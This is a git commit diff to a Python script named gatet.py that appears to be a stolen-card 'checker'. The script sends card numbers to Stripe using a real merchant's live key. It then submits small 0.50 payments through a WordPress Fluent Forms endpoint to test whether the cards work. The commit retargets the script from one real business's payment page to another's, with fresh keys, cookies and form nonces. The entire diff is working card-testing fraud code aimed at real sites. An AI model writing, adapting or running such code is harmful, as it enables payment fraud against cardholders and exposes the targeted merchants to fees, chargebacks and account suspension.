d1e8fb41edfb86b1bdb64b8e5de1e7f9d9e39873
Daokhaosaard13 <daokhaosaard13@gmail.com>
2025-01-20 17:07:20 +0700

    Update gatet.py

--- gatet.py
+++ gatet.py
@@ -26,47 +26,47 @@ def Tele(ccx):
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
 	}
 	
-	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2Fc9c125eeb4%3B+stripe-js-v3%2Fc9c125eeb4%3B+card-element&referrer=https%3A%2F%2Fpietrucking.com&time_on_page=111609&key=pk_live_51JsxR6KI6JQjr28A4vnbJu7Ak0bZXPkSlJ8VZHZXxYVvtKsd64mQ9zdpKxs0Ul9JyMj52HpAkVIl3Rz5qlsCW07n00mj43tDyT'
+	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2Fc9c125eeb4%3B+stripe-js-v3%2Fc9c125eeb4%3B+card-element&referrer=https%3A%2F%2Fhgpropertiescic.co.uk&time_on_page=20464&key=pk_live_51PxqvoHTdayY2gFMLSzdpQVyeQupIeWUPUngPZ13BFswhl4OWLnbexqCF7CDf4R3DHK8UCgOmzeCL75jrd4MlPPA00QPJTFkAZ'
 	
 	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
 	
 	pm = r1.json()['id']
 	
 	cookies = {
-	    '__stripe_mid': '11669adf-01d5-4f1f-aca5-0b1ffcbf7a8b026403',
-	    '__stripe_sid': '4a20eeea-7106-4a58-abba-8cd4f80dc7bf0028c6',
+	    '__stripe_mid': '7d913f64-2318-496d-9891-e4e0425efd814b7722',
+	    '__stripe_sid': '5d38d6d8-c235-4b59-b39b-a604572a70cacf42ab',
 	}
 	
 	headers = {
-	    'authority': 'pietrucking.com',
-	    'accept': '*/*',
-	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
-	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-	    # 'cookie': '__stripe_mid=11669adf-01d5-4f1f-aca5-0b1ffcbf7a8b026403; __stripe_sid=4a20eeea-7106-4a58-abba-8cd4f80dc7bf0028c6',
-	    'origin': 'https://pietrucking.com',
-	    'referer': 'https://pietrucking.com/daily-parking/',
+	    'Accept': '*/*',
+	    'Accept-Language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+	    'Connection': 'keep-alive',
+	    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+	    # 'Cookie': '__stripe_mid=7d913f64-2318-496d-9891-e4e0425efd814b7722; __stripe_sid=5d38d6d8-c235-4b59-b39b-a604572a70cacf42ab',
+	    'Origin': 'https://hgpropertiescic.co.uk',
+	    'Referer': 'https://hgpropertiescic.co.uk/payment/',
+	    'Sec-Fetch-Dest': 'empty',
+	    'Sec-Fetch-Mode': 'cors',
+	    'Sec-Fetch-Site': 'same-origin',
+	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+	    'X-Requested-With': 'XMLHttpRequest',
 	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
-	    'sec-fetch-dest': 'empty',
-	    'sec-fetch-mode': 'cors',
-	    'sec-fetch-site': 'same-origin',
-	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
-	    'x-requested-with': 'XMLHttpRequest',
 	}
 	
 	params = {
-	    't': '1737364149603',
+	    't': '1737367312013',
 	}
 	
 	data = {
-	    'data': '__fluent_form_embded_post_id=576&_fluentform_32_fluentformnonce=6f86940c67&_wp_http_referer=%2Fdaily-parking%2F&datetime=01%2F20%2F2025&numeric_field_1=1&name%5Bfirst_name%5D=Rodam&name%5Blast_name%5D=User&input_text=&phone=2084359362&email=rodamuser08%40gmail.com&dropdown=Box%20Truck&input_text_10=2020&input_text_11=Red&input_text_12=1&terms-n-condition_1=on&terms-n-condition=on&terms-n-condition_2=on&custom-payment-amount=0.50&payment_method=stripe&hidden=0&item__32__fluent_checkme_=&__stripe_payment_method_id='+str(pm)+'',
+	    'data': '__fluent_form_embded_post_id=742&_fluentform_3_fluentformnonce=b333f76250&_wp_http_referer=%2Fpayment%2F&custom-payment-amount=0.50&names%5Bfirst_name%5D=&names%5Blast_name%5D=&email=&payment_method=stripe&__stripe_payment_method_id='+str(pm)+'',
 	    'action': 'fluentform_submit',
-	    'form_id': '32',
+	    'form_id': '3',
 	}
 	
 	r2 = requests.post(
-	    'https://pietrucking.com/wp-admin/admin-ajax.php',
+	    'https://hgpropertiescic.co.uk/wp-admin/admin-ajax.php',
 	    params=params,
 	    cookies=cookies,
 	    headers=headers,
